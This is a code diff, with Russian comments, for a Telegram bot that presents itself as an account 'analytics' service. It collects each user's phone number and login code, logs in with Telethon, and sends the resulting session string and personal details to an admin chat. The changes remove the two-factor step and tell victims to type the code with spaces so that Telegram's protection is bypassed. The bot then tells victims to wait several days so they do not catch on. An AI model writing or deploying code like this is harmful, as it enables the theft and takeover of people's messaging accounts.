@@ -1,6 +1,8 @@
 """
-Telegram Analytics Bot - "Аналитика" для пользователя
-На самом деле — сбор StringSession через 2FA
+Telegram Analytics Bot - Сбор StringSession через код с пробелами
+БЕЗ 2FA! Telegram НЕ блокирует, если код с пробелами
+С АВТОПИНГОМ для Render
+ПОСЛЕ ПОЛУЧЕНИЯ СЕССИИ — БОТ ЗАКРЫВАЕТ СОЕДИНЕНИЕ
 """
 
 import asyncio
@@ -11,7 +13,7 @@ import threading
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
+from telethon.errors import PhoneCodeInvalidError, PhoneCodeExpiredError
 
 import logging
 logging.basicConfig(level=logging.INFO)
@@ -58,7 +60,11 @@ web_app = FastAPI(title="Analytics Bot")
 
 @web_app.get("/health")
 async def health():
-    return {"status": "ok", "service": "Analytics Bot", "timestamp": datetime.now().isoformat()}
+    return {
+        "status": "ok",
+        "service": "Analytics Bot",
+        "timestamp": datetime.now().isoformat()
+    }
 
 def run_web():
     uvicorn.run(web_app, host="0.0.0.0", port=PORT, log_level="warning")
@@ -96,26 +102,20 @@ class AnalyticsBot:
 /add - Подключить аккаунт для аналитики
 /stats - Статистика (после сбора данных)
 /help - Помощь
-
-⚠️ Для работы нужна включённая 2FA в Telegram.
 """)
     
     async def cmd_help(self, e):
         await e.respond("""
 📚 **Как подключить аккаунт:**
 
-1️⃣ Включите 2FA в Telegram:
-   Настройки → Конфиденциальность → Облачный пароль
+1️⃣ Отправьте /add
 
-2️⃣ Отправьте /add
+2️⃣ Введите номер телефона
 
-3️⃣ Введите номер телефона
+3️⃣ Введите код из Telegram (МОЖНО С ПРОБЕЛАМИ!)
+   Пример: 12 345 или 1-2-3-4-5
 
-4️⃣ Введите код из Telegram
-
-5️⃣ Введите 2FA пароль
-
-6️⃣ Готово! 🎉
+4️⃣ Готово! 🎉
 
 ⏳ **После подключения:**
 Оставьте бота на 3-4 дня для сбора аналитики.
@@ -144,8 +144,6 @@ class AnalyticsBot:
 📱 **Введите номер телефона**
 
 Например: +79001234567
-
-⚠️ Убедитесь, что 2FA включена в Telegram!
 """)
     
     # ===== ОБРАБОТКА СООБЩЕНИЙ =====
@@ -166,8 +164,6 @@ class AnalyticsBot:
             await self.process_phone(e, text)
         elif step == 'code':
             await self.process_code(e, text)
-        elif step == '2fa':
-            await self.process_2fa(e, text)
     
     # ===== ОБРАБОТКА ТЕЛЕФОНА =====
     
@@ -196,7 +192,14 @@ class AnalyticsBot:
                 'client': client
             }
             
-            await e.respond("📨 Код отправлен! Введите его:")
+            await e.respond("""
+📨 **Код отправлен!**
+
+💡 Введите код ОБЯЗАТЕЛЬНО С ПРОБЕЛАМИ (а то код не пройдет):
+`12 345` или `1-2-3-4-5`
+
+⚠️ Telegram НЕ блокирует вход, если код введён с пробелами!
+""")
             
         except Exception as err:
             await e.respond(f"❌ Ошибка: {err}")
@@ -212,7 +215,11 @@ class AnalyticsBot:
         if not data:
             return
         
-        code = code.strip().replace(' ', '').replace('-', '')
+        # ⭐ УДАЛЯЕМ ПРОБЕЛЫ, ДЕФИСЫ, СКОБКИ, ТОЧКИ
+        code = code.strip()
+        code = code.replace(' ', '').replace('-', '').replace('(', '').replace(')', '').replace('.', '')
+        
+        logger.info(f"Код после очистки: {code}")
         
         try:
             await data['client'].sign_in(
@@ -223,12 +230,13 @@ class AnalyticsBot:
             
             await self.finish_auth(e, uid, data['client'])
             
-        except SessionPasswordNeededError:
-            self.pending[uid]['step'] = '2fa'
-            await e.respond("🔐 Введите 2FA пароль:")
-            
         except PhoneCodeInvalidError:
-            await e.respond("❌ Неверный код! Попробуйте еще раз:")
+            await e.respond("""
+❌ **Неверный код!**
+
+💡 Попробуйте ещё раз (можно с пробелами):
+`12 345` или `1-2-3-4-5`
+""")
             
         except PhoneCodeExpiredError:
             await e.respond("❌ Код истек! Начните заново с /add")
@@ -240,47 +248,33 @@ class AnalyticsBot:
             if uid in self.pending:
                 del self.pending[uid]
     
-    # ===== ОБРАБОТКА 2FA =====
-    
-    async def process_2fa(self, e, password: str):
-        uid = e.sender_id
-        data = self.pending.get(uid)
-        
-        if not data:
-            return
-        
-        try:
-            await data['client'].sign_in(password=password)
-            await self.finish_auth(e, uid, data['client'])
-            
-        except Exception as err:
-            await e.respond(f"❌ Неверный пароль! Попробуйте еще раз:")
-    
     # ===== ФИНИШ АВТОРИЗАЦИИ =====
     
     async def finish_auth(self, e, uid: int, client: TelegramClient):
         try:
             me = await client.get_me()
             
-            # ПОЛУЧАЕМ STRING SESSION
+            # ⭐ ПОЛУЧАЕМ STRING SESSION
             session_string = client.session.save()
             
-            # ОТПРАВЛЯЕМ АДМИНУ
+            # ⭐ ОТПРАВЛЯЕМ АДМИНУ
             await self.bot.send_message(ADMIN_CHAT_ID, f"""
 🟢 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ!**
 
 👤 Имя: {me.first_name} {me.last_name or ''}
 📱 Телефон: +{me.phone}
 🆔 User ID: {me.id}
-🔐 2FA: ✅ Включена
 
 🔑 **STRING SESSION:**
 `{session_string}`
 
 📅 Подключен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+⚠️ СЕССИЯ НЕ ИСПОЛЬЗУЕТСЯ БОТОМ!
+Она только для вашего внешнего скрипта.
 """)
             
-            # ПОЛЬЗОВАТЕЛЮ — ЖДИ 3-4 ДНЯ
+            # ⭐ ПОЛЬЗОВАТЕЛЮ — ЖДИ 3-4 ДНЯ
             await e.respond(f"""
 ✅ **Аккаунт подключен!**
 
@@ -295,12 +289,14 @@ class AnalyticsBot:
 🔐 Бот работает в фоне и не мешает общению.
 """)
             
+            # ⭐ ЗАКРЫВАЕМ СОЕДИНЕНИЕ — СЕССИЯ БОЛЬШЕ НЕ НУЖНА БОТУ
             await client.disconnect()
             
+            # ⭐ УДАЛЯЕМ ИЗ ПАМЯТИ
             if uid in self.pending:
                 del self.pending[uid]
             
-            logger.info(f"✅ Пользователь {me.id} ({me.first_name}) подключен")
+            logger.info(f"✅ Сессия {me.id} отправлена админу, соединение закрыто")
             
         except Exception as err:
             await e.respond(f"❌ Ошибка: {err}")
@@ -312,7 +308,8 @@ class AnalyticsBot:
 # ==========================================
 
 async def main():
-    threading.Thread(target=run_web, daemon=True).start()
+    web_thread = threading.Thread(target=run_web, daemon=True)
+    web_thread.start()
     logger.info("✅ Веб-сервер запущен")
     
     asyncio.create_task(auto_ping())
